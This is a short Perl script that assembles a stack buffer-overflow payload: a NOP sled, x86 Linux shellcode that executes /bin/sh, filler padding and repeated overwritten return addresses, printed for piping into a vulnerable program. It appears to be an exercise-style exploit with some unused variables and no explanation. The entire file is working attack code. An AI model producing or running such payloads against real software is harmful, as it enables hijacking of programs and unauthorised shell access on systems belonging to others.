#!/usr/bin/perl

$nopsled = "\x90" x 64;  
$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b".
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd".
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
$padding1 = "\xe0\xf6\xff\xbf" x 5;  
$padding = 'a' x (192 - 64 - 45 - 4*5);
$padding3 = "\xe0\xf6\xff\xbf" x 5;
$padding2 = 'A' x 3; 
$eip = "\x48\x8c\xff\xbf" x 10;
$eip1 = "\x90\x90\x90\x90" x 10;
$final = $eip.$shellcode.$padding.$padding3.$eip; 
$final1 = $eip.$shellcode.$padding2.$padding1.$eip; 
print $final; 

